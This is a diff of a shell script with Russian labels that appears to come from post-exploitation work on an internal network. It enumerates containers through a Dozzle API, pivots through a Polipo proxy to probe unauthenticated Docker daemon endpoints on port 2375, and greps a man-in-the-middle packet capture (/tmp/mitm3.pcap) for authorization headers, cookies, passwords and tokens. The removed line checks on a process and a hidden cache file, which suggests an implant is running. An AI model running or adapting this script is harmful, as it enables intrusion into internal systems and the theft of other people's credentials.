@@ -1,1 +1,27 @@
-echo PULSE-$(hostname)-$(date +%H:%M:%S); pgrep -c updt 2>/dev/null; cat /opt/.cache/.last 2>/dev/null | head -c 80; echo; wc -c /tmp/mitm3.pcap 2>/dev/null
+echo "=== DOZZLE контейнеры ==="
+python3 -c "
+import urllib.request,json
+r=urllib.request.urlopen('http://192.168.3.121:8080/api/hosts/7f4e70d2-a0b4-43d8-9813-45d4736bc874/containers',timeout=8)
+d=json.loads(r.read())
+for c in d:
+    print(c.get('name','?'),c.get('state','?'),c.get('id','')[:12])
+"
+echo "=== POLIPO→DOCKER ==="
+python3 -c "
+import urllib.request
+proxy='http://192.168.3.121:8123'
+op=urllib.request.build_opener(urllib.request.ProxyHandler({'http':proxy}))
+for t in ['http://172.18.0.1:2375/version','http://127.0.0.1:2375/version','http://localhost:8000/api/v1/health']:
+    try: print(t.split('//')[1],'→',op.open(t,timeout=4).read()[:150])
+    except Exception as e:
+        if 'refused' not in str(e) and 'timed' not in str(e): print(t.split('//')[1],'→',str(e)[:60])
+"
+echo "=== MITM pcap: HTTP заголовки ==="
+python3 -c "
+import subprocess
+r=subprocess.run(['tcpdump','-r','/tmp/mitm3.pcap','-A','-c','200'],capture_output=True,text=True,timeout=10)
+for line in r.stdout.split(chr(10)):
+    if any(x in line.lower() for x in ['authorization','cookie','password','login','basic','bearer','token']):
+        print(line[:120])
+" 2>/dev/null | sort -u | head -15
+echo FINAL
